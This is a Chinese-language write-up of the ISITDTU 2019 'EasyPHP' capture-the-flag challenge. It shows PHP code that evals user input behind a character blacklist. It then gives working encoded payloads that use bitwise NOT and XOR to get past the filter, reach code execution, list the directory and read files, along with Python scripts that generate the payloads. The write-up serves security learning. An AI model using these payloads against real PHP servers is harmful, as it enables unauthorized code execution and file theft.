# \[ISITDTU 2019]EasyPHP

## \[ISITDTU 2019]EasyPHP

## 考点

* 无字符代码执行

## wp

```php
<?php
highlight_file(__FILE__);

$_ = @$_GET['_'];
if ( preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i', $_) )
    die('rosé will not do it');

if ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )
    die('you are so close, omg');

eval($_);
?>
```

代码执行，最后一个if不允许使用的字符超过12个

然后输入黑名单如下

```
ASCII值0-32
数字0-9 ASCII是48-57
'"`$&.,|[{_defgops ASCII对应39,34,96,36,38,46,44,124,91,123,95,100,101,102,103,111,112,115
```

到这里想到的绕过方式是异或和取反，然后在返回头看一下PHP版本是7.3，那就可以用函数执行的特性结合取反

phpinfo取反为%8F%97%8F%96%91%99%90，PHP7函数执行`(~%8F%97%8F%96%91%99%90)();`，长度为10

看到disable\_functions

![](<../.gitbook/assets/image (1) (1) (1) (1) (1).png>)

但是有字符使用的限制，所以还是要考虑其他方式。以前p牛说过无字符getshell可以用自增、位运算和取反，再偷一波陆队的思路。

现在可以考虑一下自增。PHP在获取HTTP参数时默认是字符串，然后可以用`!`进行布尔类型转换，再用`@`忽略notice输出，就可以把`!!@a`转化为数字1，然后再用`chr()`转换拼接就可以构造任意函数，但是需要用`.`拼接

```
// phpinfo();
(chr((!!@a%2b!!@a%2b!!@a)**(!!@a%2b!!@a%2b!!@a)*(!!@a%2b!!@a%2b!!@a%2b!!@a)%2b(!!@a%2b!!@a%2b!!@a%2b!!@a)).chr((!!@a%2b!!@a%2b!!@a)**(!!@a%2b!!@a%2b!!@a)*(!!@a%2b!!@a%2b!!@a%2b!!@a)-(!!@a%2b!!@a%2b!!@a%2b!!@a)).chr((!!@a%2b!!@a%2b!!@a)**(!!@a%2b!!@a%2b!!@a)*(!!@a%2b!!@a%2b!!@a%2b!!@a)%2b(!!@a%2b!!@a%2b!!@a%2b!!@a)).chr((!!@a%2b!!@a%2b!!@a)**(!!@a%2b!!@a%2b!!@a)*(!!@a%2b!!@a%2b!!@a%2b!!@a)-(!!@a%2b!!@a%2b!!@a)).chr((!!@a%2b!!@a%2b!!@a)**(!!@a%2b!!@a%2b!!@a)*(!!@a%2b!!@a%2b!!@a%2b!!@a)%2b(!!@a%2b!!@a)).chr((!!@a%2b!!@a%2b!!@a)**(!!@a%2b!!@a%2b!!@a)*(!!@a%2b!!@a%2b!!@a%2b!!@a)-(!!@a%2b!!@a%2b!!@a%2b!!@a%2b!!@a%2b!!@a)).chr((!!@a%2b!!@a%2b!!@a)**(!!@a%2b!!@a%2b!!@a)*(!!@a%2b!!@a%2b!!@a%2b!!@a)%2b(!!@a%2b!!@a%2b!!@a)))();
```

使用异或，如果用爆破的方法就会很慢，偷一波陆队的思路。先确定自己想执行的语句，比如phpinfo，然后定一个参考字符串，让phpinfo和它异或，就可以得到想要的输入，如果得到的结果不符合要求，再微调参考字符串

```
p:%8f^%ff
h:%97^%ff
i:%96^%ff
n:%91^%ff
f:%99^%ff
o:%90^%ff
```

结果是`%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff`，脚本如下：

```php
target = "phpinfo"
standard = 0xff

dicts = {}
for i in target:
    dicts[i] = hex(ord(i)^standard).replace('0x','%')

res = ''
for i in target:
    res = res+dicts[i]
print(res+'^'+"%ff"*len(target))
print(len(set(res+'^'+"%ff"*len(target))))
```

但是这里有个疑问，`%21^%4f`的结果是`n`，但是在测试的时候却不对

![](<../.gitbook/assets/image (18) (1) (1) (1).png>)

加上引号就可以了

![](<../.gitbook/assets/image (31) (1) (1) (1) (1).png>)

用数字也是同样的道理，一开始一直报错，但是把数字用`trim`转换一下就可以了。然后用自增找到数字

![](<../.gitbook/assets/image (14) (1) (1) (1).png>)

```
p:A^1
h:Y^1
i:X^1
n:Z^4
f:W^1
o:Z^5
```

结果是`AYAXZWZ^1111415`

```
(trim((!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a)*((!!%40a%2b!!%40a)**(!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a)%2b(!!%40a%2b!!%40a)**(!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a)%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a)*((!!%40a%2b!!%40a)**(!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a)%2b(!!%40a%2b!!%40a)**(!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a)-(!!%40a%2b!!%40a)**(!!%40a%2b!!%40a%2b!!%40a%2b!!%40a%2b!!%40a)-!!%40a-!!%40a-!!%40a))%5e%40AYAXZWZ)();
```

这里如果要求字符种类最少，可以考虑使用%ff的方式，先生成语句，再去尝试找可以替换的字符。如下，共用了16个字符

```
print_r(scandir('.'))
(%8f%8d%96%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff)((%8c%9c%9e%91%9b%96%8d^%ff%ff%ff%ff%ff%ff%ff)((%d1^%ff)));
```

所以要找到可以替换的，即在内部可以互相异或出来的，目标代码用到的字符为`['n', 'p', 'c', 's', 'i', 'a', 't', 'd', 'r', '_', '.']`，写个脚本找一下

```python
s=['n', 'p', 'c', 's', 'i', 'a', 't',  'd', 'r', '_', '.']
for i in s:
    for j in s:
        for k in s:
            if (chr(ord(i)^ord(j)^ord(k)) in s):
                xorRes = i+'^'+j+'^'+k
                if len(set(xorRes)) == 4:
                    print(chr(ord(i)^ord(j)^ord(k))+'='+xorRes)
```

得到的结果对应如下

```
p %8f^%ff
r %8d^%ff
i %96^%ff    %9c^%ff^%9b^%91
n %91^%ff 
t %8b^%ff
_ %a0^%ff
s %8c^%ff    %9c^%ff^%9b^%8b
c %9c^%ff
a %9e^%ff    %8d^%ff^%9c^%8f
d %9b^%ff
. %d0^%ff
```

找一下就可以找到，原则先找必须存在的字符，比如`.`和`_`，那么`a,d,0`也必须存在，那么r就必须存在，同样的，对于字符c和d，在生成的URL编码中也有，所以c和d也必须存在，如果换掉，相当于没有做异或，对于n和i而言，哪个都可以，后续不牵扯到6和1，然后看t和s，他们也是哪个都可以，他们URL编码中的b和c都已经存在，最后是a和p，明显a含有的字符更多，要保留p

```
a=r^c^p
s=c^d^t 
i=c^d^n 
```

最后结果

```
p %8f^%ff
r %8d^%ff
i %9c^%ff^%9b^%91
n %91^%ff 
t %8b^%ff
_ %a0^%ff
s %9c^%ff^%9b^%8b
c %9c^%ff
a %8d^%ff^%9c^%8f
d %9b^%ff
. %d1^%ff
```

`print_r(scandir('.'))`

```
(%8f%8d%9c%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff^%ff%ff%9b%ff%ff%ff%ff^%ff%ff%91%ff%ff%ff%ff)((%9c%9c%8d%91%9b%9c%8d^%ff%ff%ff%ff%ff%ff%ff^%9b%ff%9c%ff%ff%9b%ff^%8b%ff%8f%ff%ff%91%ff)((%d1^%ff)));
```

![](<../.gitbook/assets/image (13) (1).png>)

`readfile(end(scandir('.')))`

```
((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF)));
```

## 小结

1. [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
2. [无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

